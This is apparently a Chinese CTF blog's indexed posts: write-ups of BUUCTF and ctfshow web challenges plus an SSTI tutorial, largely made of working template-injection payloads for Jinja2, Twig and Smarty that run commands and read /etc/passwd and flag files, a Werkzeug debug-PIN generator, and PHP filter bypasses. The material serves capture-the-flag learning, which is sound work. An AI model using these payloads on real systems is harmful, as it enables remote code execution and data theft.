href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>这里的突破口是flag页面的用户登录</p><p>测试有模板注入漏洞</p><img src="/2023/08/03/buuctf/213113.png" class=""><p>通过判断，是Twig注入，所以有固定的payload</p><pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("id")&#125;&#125;//查看id&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;//查看flag</code></pre><p>这道题不能直接在页面进行注入，要在cookie里面注入</p><img src="/2023/08/03/buuctf/214658.png" class=""><h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><p>题目给的源码：</p><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>这题是flask模板注入</p><p>审计题目给的源码，在shrine路径下测试ssti能正常执行</p><p>接着分析源码，注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接<code>&#123;&#123;config&#125;&#125;</code>或<code>&#123;&#123;self.*dict*&#125;&#125;</code>即可查看所有app.config内容，但是这题设了黑名单，把<code>[‘config’,‘self’]</code>设为None并且过滤了括号；当这些被过滤的时候，我们需要借助一些全局变量利用沙盒逃逸的方法，来调用被禁用的函数对象。</p><pre><code>current_app,这是全局变量代理（当前app），查看他的config即可</code></pre><p>我们写payload:</p><pre><code>&#123;&#123;url_for.__globals__&#125;&#125;</code></pre><img src="/2023/08/03/buuctf/161525.png" class=""><p>然后：</p><pre><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></pre><img src="/2023/08/03/buuctf/161827.png" class=""><h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><p>题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。</p><p>在页面的右上角发现了IP，猜测这个IP受X-Forwarded-For头控制。</p><p>将XFF头改为 {6*7} 会发现该位置的值变为了42，便可以确定这里存在SSTI。</p><img src="/2023/08/03/buuctf/210001.png" class=""><p>直接构造 {system(‘cat &#x2F;flag’)} 即可得到flag</p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>题目提示是flask</p><p>在加密内输入49 ，生成base64码e3s3Kjd9fcKg； 将e3s3Kjd9fcKg输入到解码框内，显示no no no说明存在防御</p><p>换一个输入14，base64码为e3s3Kzd9fQ&#x3D;&#x3D;，解码后，显示的是14，因此存在ssti</p><p>在解码页面随便输几个字符，看到报错信息，网站打开了flask的debug模式，在debug页面我们可以看到文件名，路径，源码和出错的方法名等信息</p><img src="/2023/08/03/buuctf/202344.png" class=""><h5 id="预期解-利用PIN码进行RCE"><a href="#预期解-利用PIN码进行RCE" class="headerlink" title="预期解 利用PIN码进行RCE"></a>预期解 利用PIN码进行RCE</h5><p>经过测试，执行命令的ssti注入方法别过滤了，按照提示，应该想办法用pin码</p><p><a href="https://zhuanlan.zhihu.com/p/32336971">https://zhuanlan.zhihu.com/p/32336971</a></p><p>pin码的生成需要下面这些东西：</p><pre><code>1、服务器运行flask所登录的用户名。 通过读取/etc/passwd获得2、modname 一般不变就是flask.app3、getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变4、flask库下app.py的绝对路径。通过报错信息就会泄露该值。5、当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address获得 //eth0处为当前使用的网卡6、最后一个就是机器的id。 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取/proc/self/cgroup：</code></pre><p>先读登录的用户名</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><img src="/2023/08/03/buuctf/214252.png" class=""><p>其中的用户名是flaskweb</p><p>我们用上面的payload稍加改动，将其中读文件的部分改成&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，就可以读取机器的MAC地址了</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><img src="/2023/08/03/buuctf/214822.png" class=""><p>将7e5fe8cec8a7转换为10进制为：138950392858791</p><p>按照其他师傅wp，题目是docker环境，因此读机器id需要读&#x2F;proc&#x2F;self&#x2F;cgroup，但搞了半天生成的pin不对，后面试了一下&#x2F;etc&#x2F;machine-id，没想到对了，想想应该是其他师傅正式比赛时时docker环境，而我在buu做的时候是linux环境</p><img src="/2023/08/03/buuctf/220612.png" class=""><p>1408f836b0ca514d796cbf8960e45fa1</p><p>然后用巨佬写的exp生成pin码</p><pre><code>import hashlibfrom itertools import chainprobably_public_bits = [    &#39;flaskweb&#39;# username    &#39;flask.app&#39;,# modname    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))    &#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),]private_bits = [    &#39;138950392858791&#39;,# str(uuid.getnode()),  /sys/class/net/ens33/address    &#39;1408f836b0ca514d796cbf8960e45fa1&#39;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode(&#39;utf-8&#39;)    h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]num = Noneif num is None:    h.update(b&#39;pinsalt&#39;)    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)                          for x in range(0, len(num), group_size))            break    else:        rv = numprint(rv)//267-749-798</code></pre><p>将生成的pin码传入，然后就可以在终端RCE了</p><img src="/2023/08/03/buuctf/230037.png" class=""><h5 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h5><p>先读app.py</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><img src="/2023/08/03/buuctf/230934.png" class=""><p>主要审计一下waf，过滤了import,flag,os,system,popen,eval等</p><p>不过可以使用字符串拼接绕过或字符串倒转</p><p>找目录</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__'+'("o'+'s")'+'.pope'+'n'+'("ls /").read()')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;或&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>再读flag</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['open']('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;//字符串倒转&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h1 id="混杂"><a href="#混杂" class="headerlink" title="混杂"></a>混杂</h1><h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>扫了一下目录发现有.git，应该是git文件泄露，用githack扫一下：</p><img src="/2023/08/03/buuctf/204241.png" class=""><p>能扫到index.php和flag.php，但down不下来，可能是靶机的原因，在网上找一下</p><pre><code>&lt;?phpinclude &#39;flag.php&#39;;print_r($flag);$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#39;yds&#39;;foreach($_POST as $x =&gt; $y)&#123;  // $键 = $值的值    $$x = $y;      &#125;foreach($_GET as $x =&gt; $y)&#123;    $$x = $$y;// $handsome = flag的值  ---&gt;   $handsome = $flag  --&gt; $x=handsome &amp; $y=flag&#125; // 需要不满足以下几个条件foreach($_GET as $x =&gt; $y)&#123;    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;  //不能同时 flag的值等于某个键名，那个键值又是flag        exit($handsome);    &#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;// 不能同时  GET 和 POST 都没设置 flag    exit($yds);&#125;if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;// 任意都不能满足 flag === &#39;flag&#39;    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;</code></pre><p>看了一下wp，在三个判断中有三种变量覆盖解法：</p><p>1、利用handsome</p><pre><code>?handsome=flag&amp;flag=dd&amp;dd=xxx</code></pre><p>2、利用yds</p><pre><code>?yds=flag</code></pre><p>3、利用is</p><pre><code>?is=flag&amp;flag=flag</code></pre><h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><p>查看源代码：</p><img src="/2023/08/03/buuctf/213947.png" class=""><p>直接可以进入flag.php:</p><img src="/2023/08/03/buuctf/214134.png" class=""><p>通过这两句话的提示，我们尝试在请求包中加入X-Forwarded-For: 127.0.0.1</p><p>最后成功获得flag</p><h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p>输入前三个商品的价格：</p><img src="/2023/08/03/buuctf/223742.png" class=""><p>输入最后一个商品：</p><img src="/2023/08/03/buuctf/223958.png" class=""><p>告诉了我们只能使用一个字符，一个字符能够购买的就只有前三只独角兽，虽然我也没有购买成功hhh</p><p>所以猜测只要购买了第四只独角兽，就能获取flag</p><p>于是我们需要找到单个字符utf-8解码后比1337大的数字</p><p>这里有其他师傅给的网站：</p><p><a href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a></p><p>搜索：<code>thousand</code>，选择一个<strong>Numeric Value</strong>大于<code>1337</code>的字符：</p><img src="/2023/08/03/buuctf/225226.png" class=""><img src="/2023/08/03/buuctf/225417.png" class=""><p>将<code>0xE2 ox86 ox88</code>的0x换成%然后传参即可成功获得flag</p><p>这道题其实可以直接传”万”字通过</p><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><pre><code>&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    //例子 c=20-1    $content = $_GET[&#39;c&#39;];    if (strlen($content) &gt;= 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    //帮你算出答案    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;</code></pre><p>这道题有黑名单和白名单，屏蔽了很多东西</p><p>我们一般rce要构造出如下代码：</p><pre><code>?c=system(&quot;cat /flag&quot;)</code></pre><p>但是system和引号没法绕过白名单，空格和引号没法通过黑名单</p><p>引号其实可以省略，system可以不用引号</p><p>这里有个知识点是php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’)</p><pre><code>?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</code></pre><p>但是问题又来了，_GET不是白名单里的变量名，[]也被黑名单过滤</p><p>[]可以用{}绕过</p><p>_GET就要用到<strong>hex2bin() 函数</strong></p><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p><p>所以我们先把_GET转为16进制</p><p><code>5f 47 45 54</code></p><p>然后_GET&#x3D;hex2bin(5f 47 45 54)</p><p>但<code>hex2bin</code>也不是白名单里的函数，所以我们这里要用到**base_convert()**函数来进行转换</p><p>base_convert()函数能够在任意进制之间转换数字</p><p>这里的hex2bin可以看做是36进制，用base_convert来转换将一个10进制的数字转换为36进制就可以出现hex2bin</p><img src="/2023/08/03/buuctf/212700.png" class=""><p>所以hex2bin&#x3D;base_convert(37907361743,10,36)</p><p><code>5f 47 45 54</code>也不能直接填，因为会被<code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</code> 这句话当作函数名放进白名单里检测，所以只能全是数字才不会被正则匹配到，所以<code>5f 47 45 54</code>也需要经过进制转化，<strong>dechex()</strong> 函数把十进制数转换为十六进制数。</p><img src="/2023/08/03/buuctf/214249.png" class=""><p>5f474554&#x3D;dechex(1598506324)</p><p>所以</p><pre><code>_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))</code></pre><p>将_GET存进一个变量里：</p><pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));</code></pre><p>payload</p><pre><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;pi&#125;)($$pi&#123;log&#125;)&amp;pi=system&amp;log=cat /flag</code></pre><h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h3><p>题目给了一个账户：cookie<code>/</code>monster，登录抓包</p><img src="/2023/08/03/buuctf/223542.png" class=""><p>发现设置了一个cookie：username&#x3D;cookie</p><p>接着携带cookie发包尝试获得flag</p><img src="/2023/08/03/buuctf/224021.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入</title>
      <link href="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>常见的模板引擎有</p><pre><code>1.php 常用的SmartySmarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛TwigTwig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。BladeBlade 是 Laravel 提供的一个既简单又强大的模板引擎。和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade基本上不会给你的应用增加任何额外负担。2.Java 常用的JSP这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典FreeMarkerFreeMarker是一款模板引擎：即一种基于模板和要改变的数据，并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。VelocityVelocity作为历史悠久的模板引擎不单单可以替代JSP作为JavaWeb的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。3.Python 常用的Jinja2flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎djangodjango 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了tornadotornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</code></pre><p>检测到模板注入后，我们需要判断具体的模板引擎：</p><img src="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/888888.png" class=""><p>这里的绿线表示结果成功返回，红线反之。有些时候，同一个可执行的 payload 会在不同引擎中返回不同的结果，比方说49会在 Twig 中返回49，而在 Jinja2 中则是7777777。</p><h1 id="python中的SSTI"><a href="#python中的SSTI" class="headerlink" title="python中的SSTI"></a>python中的SSTI</h1><h3 id="jinjia2"><a href="#jinjia2" class="headerlink" title="jinjia2"></a>jinjia2</h3><p>flask常用注入模块：</p><img src="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/164120.png" class=""><p>jinja2的Python模板解释器在构建的时候考虑到了安全问题，删除了大部分敏感函数，相当于构建了一个沙箱环境。但是一些内置函数和属性还是依然可以使用，而Flask的SSTI就是利用这些内置函数和属性相互组建来达到调用函数的目的，从而绕过沙箱：</p><pre><code>引导类：()/[]/&#39;&#39;/&quot;&quot;/&#123;&#125;/数字/x(这里的x任意26个英文字母的任意组合都可以)    虚空类，可以这样&#123;&#123;x.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app（当前app）。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且get_flashed_messages.__globals__[&#39;__builtins__&#39;]含有current_app。lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;魔术方法：__class__            类的一个内置属性，表示类型的所属对象。__base__             类型对象的直接基类（直接父类）__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找全部基类及当前类。__subclasses__()     返回当前类的子类集合__init__             初始化类，返回的类型是function（查看类是否重载，重载是指程序在运行时就已经加载好了这个类到内存中，如果出现wrapper字眼，说明没有重载）__globals__          使用方式是 function名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)注：__getitem__()也可以用get()来代替__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。current_app          应用上下文，一个全局变量。g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></pre><pre><code>request                 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()request.args.x1    get传参request.values.x1  所有参数request.cookies.x1       cookies参数request.headers         请求头参数request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data   post传参(Content-Type:a/b)request.json post传json  (Content-Type: application/json)</code></pre><pre><code>jinjia2一共三种语法&#123;&#123; &#125;&#125;称之为变量代码块；&#123;% %&#125;称之为控制代码块，可以实现一些语言层次的功能，比如循环语句。不同语言不同模板的代码块形式不同；注释</code></pre><p>过滤器（例：()|select|string|list）</p><pre><code>int()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。例如得到把字典的键名拼接后的值abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()返回字符串的长度，别名是count</code></pre><h1 id="php中的SSTI"><a href="#php中的SSTI" class="headerlink" title="php中的SSTI"></a>php中的SSTI</h1><h3 id="smart"><a href="#smart" class="headerlink" title="smart"></a>smart</h3><p>利用方式：</p><p>1、</p><pre><code>&#123;if system(&quot;ls&quot;)&#125;&#123;/if&#125;</code></pre><p>Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||<em>，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{&#x2F;if}</em></p><p>2、</p><pre><code> &#123;system(&#39;ls&#39;)&#125;</code></pre><p>3、</p><pre><code>&#123;$smarty.version&#125;  #获取smarty的版本号</code></pre><p>旧版本：</p><p>4、</p><pre><code>&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</code></pre><p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而在3.1.30的Smarty版本中官方已经把该静态方法删除。对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p><p>5、</p><pre><code>&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;   </code></pre><p>这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境。</p><p>6、</p><pre><code>&#123;php&#125;phpinfo();&#123;/php&#125;  #执行相应的php代码</code></pre><p>Smarty支持使用 {php}{&#x2F;php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p><p>参考：</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI模板注入总结</a></p><p><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p><p><a href="https://xz.aliyun.com/t/6885">Python模板注入(SSTI)深入学习</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">jinjia2模板注入绕过（进阶篇）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI注入(ctfshow)</title>
      <link href="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/"/>
      <url>/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><p>payload（调用了“os_wrap_close”）:</p><pre><code>?name=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()&#125;&#125;</code></pre><p>or</p><pre><code>?name=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125; //使用内建名称空间</code></pre><h3 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h3><p>这关好像是频闭了父类下面的所有子类</p><p>payload</p><pre><code>?name=&#123;&#123;config.__class__.__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre><p>or</p><pre><code>?name=&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat /flag').read()&#125;&#125;</code></pre><p>or</p><pre><code>?name=&#123;&#123;x.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;//这里的x任意26个英文字母的任意组合都可以</code></pre><h3 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h3><p>这关过滤了单双引号</p><p>参考：<a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a></p><p>我们可以使用request.args来绕过此处引号的过滤。</p><p>request.args是flask中一个存储着请求参数以及其值的字典</p><pre><code>?name=&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a][request.args.b](request.args.c)&#125;&#125;&amp;a=__builtins__&amp;b=eval&amp;c=__import__(&#39;os&#39;).popen(&quot;ls&quot;).read()</code></pre><p>也可以考虑字符串拼接，这里用config拿到字符串，比较麻烦就不全演示了</p><pre><code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;</code></pre><p>相当于?name&#x3D;</p><h3 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h3><p>这关过滤了引号和args，用request.from提交发现不允许，但可以用cookies</p><pre><code>?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;Cookie: 